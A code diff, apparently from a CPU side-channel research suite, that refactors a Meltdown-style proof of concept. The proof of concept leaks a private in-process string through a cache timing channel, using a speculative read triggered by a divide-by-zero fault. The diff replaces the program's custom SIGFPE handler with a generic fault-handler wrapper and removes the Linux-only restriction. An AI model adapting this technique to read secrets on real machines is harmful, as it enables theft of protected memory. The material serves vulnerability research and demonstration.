@@ -19,10 +19,6 @@
 
 #include "compiler_specifics.h"
 
-#if !SAFESIDE_LINUX
-#  error Unsupported OS. Linux required.
-#endif
-
 #if !SAFESIDE_IA32 && !SAFESIDE_X64
 #  error Unsupported architecture. x86/64 required.
 #endif
@@ -31,11 +27,9 @@
 #include <cstring>
 #include <iostream>
 
-#include <signal.h>
-
 #include "cache_sidechannel.h"
+#include "faults.h"
 #include "instr.h"
-#include "meltdown_local_content.h"
 #include "utils.h"
 
 const char *public_data = "Hello, world!";
@@ -75,26 +69,21 @@ static char LeakByte(size_t offset) {
     size_t safe_offset = run % strlen(public_data);
     sidechannel.FlushOracle();
 
-    ForceRead(isolated_oracle.data() + static_cast<size_t>(
-        public_data[safe_offset]));
+    bool handled_fault = RunWithFaultHandler(SIGFPE, [&]() {
+      ForceRead(isolated_oracle.data() + static_cast<size_t>(
+          public_data[safe_offset]));
 
-    // This fails with division exception. Whatever is the result of 1 % 0, it
-    // cannot be more than 1 and first two characters are dummy in each private
-    // string. During the modulo by zero, SIGFPE is raised and the signal
-    // handler moves the instruction pointer to the afterspeculation label.
-    ForceRead(isolated_oracle.data() + static_cast<size_t>(
-        private_data[offset][two % zero]));
+      // This fails with division exception. Whatever is the result of 1 % 0, it
+      // cannot be more than 1 and first two characters are dummy in each
+      // private string. During the modulo by zero, SIGFPE is raised.
+      ForceRead(isolated_oracle.data() + static_cast<size_t>(
+          private_data[offset][two % zero]));
+    });
 
-    std::cout << "Dead code. Must not be printed." << std::endl;
-
-    // The exit call must not be unconditional, otherwise clang would optimize
-    // out everything that follows it and the linking would fail.
-    if (strlen(public_data) != 0) {
+    if (!handled_fault) {
+      std::cerr << "Read didn't yield expected fault" << std::endl;
       exit(EXIT_FAILURE);
     }
-
-    // SIGFPE signal handler moves the instruction pointer to this label.
-    asm volatile("afterspeculation:");
 
     std::pair<bool, char> result =
         sidechannel.RecomputeScores(public_data[safe_offset]);
@@ -111,7 +100,6 @@ static char LeakByte(size_t offset) {
 }
 
 int main() {
-  OnSignalMoveRipToAfterspeculation(SIGFPE);
   std::cout << "Leaking the string: ";
   std::cout.flush();
   for (size_t i = 0; i < kPrivateDataLength; ++i) {
